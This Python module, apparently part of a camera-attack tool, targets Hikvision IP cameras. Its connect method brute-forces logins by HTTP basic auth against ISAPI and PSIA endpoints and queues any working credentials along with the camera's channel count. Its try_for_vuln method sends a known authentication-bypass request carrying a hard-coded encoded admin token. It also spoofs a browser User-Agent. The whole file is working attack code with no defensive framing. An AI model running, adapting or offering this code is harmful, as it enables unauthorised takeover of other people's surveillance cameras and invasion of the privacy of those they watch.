from re import findall
from modules import progress
from modules.networking import http_connect
from modules.tools import read_file, bold, red, green


class Hikvision:
    def __init__(self, parent):
        #self.cam = None
        #self.response = None
        self.parent = parent
        self.server = self.parent.data['authservice']
        self.realm = 'unknown'
        self.isDone = False
        self.threads = []
        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US)'}
        self.source = '/ISAPI/System/status'
        self.method = 'get'
        self.ip = self.parent.data['ip']
        self.port = self.parent.data['port']
        self.url = 'http://' + self.parent.data['ip'] + ':' + self.parent.data['port']
        # self.vuln = self.try_for_vuln()
        self.previous = ''
        self.result_queue = parent.result_queue
        self.bad_msg = ['<statusCode>4</statusCode>', '<statusValue>401</statusValue>',
                        '<statusString>Invalid Operation</statusString>', 'Access Error: 401', 'HTTP/1.1 401 Unauthorized',
                        '404', '403 Forbidden']
    def connect(self, username, password):
        # print(self.server)
        if self.server == 'Hikvision-Webs':
            resp = http_connect.basic_auth_check(self.ip, self.port, usr=username, pwd=password, returnall=True,
                                                 path='/PSIA/Custom/SelfExt/userCheck')
        else:
            resp = http_connect.basic_auth_check(self.ip, self.port, usr=username, pwd=password, returnall=True,
                                                 path='/ISAPI/System/Video/inputs/channels')#/ISAPI/System/status
            # resp = resp.text
        if resp:
            if '<statusValue>200</statusValue>' in resp or all([msg not in resp for msg in self.bad_msg]) and len(resp) > 17:
                channels_count = len(findall('VideoInputChannel ', resp))
                self.parent.data['ch'] = channels_count if channels_count else 9
                if self.parent.data['usr'] == username:
                    return False
                self.parent.data['usr'] = username
                self.parent.data['pwd'] = password
                self.result_queue.put(self.parent.data)
                progress.increment('successful')
                self.parent.sig.change_successful_counter.emit(green(str(progress.get_successful_counter())))
                self.parent.isDone = True
                return True
            else:
                return False
        else:
            return False

    def try_for_vuln(self):
        if self.server == 'App-webs/':
            try:
                resp = http_connect.basic_auth_check(self.ip, self.port, path='/system/deviceInfo?auth=YWRtaW46MTEK')
                # resp = Request(self.ip, path='/system/deviceInfo?auth=YWRtaW46MTEK')
                # resp.check()
                if resp:
                    self.parent.data['vuln'] = True
                    progress.increment('successful')
                    self.result_queue.put(self.parent.data)
                    self.parent.isDone = True
                    return True

            except Exception as e:
                print(e)
                return False
        else:
            return False
